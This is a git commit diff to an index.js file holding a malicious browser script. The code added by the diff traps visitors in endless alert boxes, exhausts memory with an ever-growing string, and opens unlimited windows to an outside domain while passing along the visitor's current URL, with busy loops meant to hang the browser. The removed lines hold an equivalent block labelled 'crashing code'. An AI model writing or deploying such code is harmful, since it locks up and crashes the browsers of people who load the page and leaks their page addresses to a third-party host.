ef8307ca0335eb5423f340fb9148acbbcf71b90e
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-12 15:37:42 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,37 +1,27 @@
 var myPopup = window.open("site-on-my-domain", "screenX=100");
 if (!myPopup)
-  while(true){
-  alert("THICC KATZ")
-  }
-else {
-  myPopup.onload = function() {
+  while (true) {
+    alert("Please allow pop-ups for this website")
     setTimeout(function() {
-      if (myPopup.screenX === 0)
-
-        while (true) {
-        window.open("http://kplibrary.cf/")
-        var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-        var URL = "http://kplibrary.cf/" + location.href;
-        var win = window.open(URL, "_blank", strWindowFeatures);
-        setTimeout(function() {
-          for (var i = 0; i === i; i++) {}
-        }, 5);
+      txt = "a";
+      while (true) {
+        txt = txt += "a";
       }
-    }, 0);
-  };
-}
+    }, 50000);
+  } else {
+    myPopup.onload = function() {
+      setTimeout(function() {
+        if (myPopup.screenX === 0)
 
-
-
-
-//: crashing code:
-
-while (true) {
-    window.open("http://kplibrary.cf/")
-    var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-    var URL = "http://kplibrary.cf/" + location.href;
-    var win = window.open(URL, "_blank", strWindowFeatures);
-    setTimeout(function() {
-      for (var i = 0; i === i; i++) {}
-    }, 5);
+          while (true) {
+          window.open("http://kplibrary.cf/")
+          var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+          var URL = "http://kplibrary.cf/" + location.href;
+          var win = window.open(URL, "_blank", strWindowFeatures);
+          setTimeout(function() {
+            for (var i = 0; i === i; i++) {}
+          }, 5);
+        }
+      }, 0);
+    };
   }
